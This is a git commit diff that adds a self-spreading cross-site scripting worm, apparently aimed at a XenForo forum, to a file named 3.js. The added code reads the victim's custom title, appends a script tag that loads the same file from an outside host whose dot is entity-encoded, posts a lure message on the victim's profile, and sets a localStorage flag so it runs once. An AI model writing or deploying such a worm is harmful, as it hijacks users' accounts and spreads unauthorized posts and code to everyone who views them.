c908603192b5cc80b082d2ba36d9d408439aea11
niksdev09 <59556607+niksdev09@users.noreply.github.com>
2025-04-06 19:05:30 +0300

    Update 3.js

--- 3.js
+++ 3.js
@@ -1,1 +1,23 @@
-XenForo.ajax('/install/post', {message_html: '<p>+rep</p>'})
+
+(async function() {
+  'use strict';
+  const payload = "<script src='//niks&#46;dev/3.js'>"
+  
+  async function main() {
+    if (localStorage.getItem('asdasd')){
+      return;
+    }
+    const ajaxData = await XenForo.ajax("account/personal-details");
+    let custom_title = $(ajaxData.templateHtml).find("#ctrl_custom_title").val();
+    
+    if (custom_title.length < 64-payload.length) {
+      await XenForo.ajax("account/status-update", {custom_title: custom_title+payload});
+    }
+    
+    
+    await XenForo.ajax(`/members/${XenForo.visitor.user_id}/post`, {message_html: 'А что у @its_niks со статусом?'});
+    localStorage.setItem('asdasd', true)
+  }
+  
+  await main();
+})();
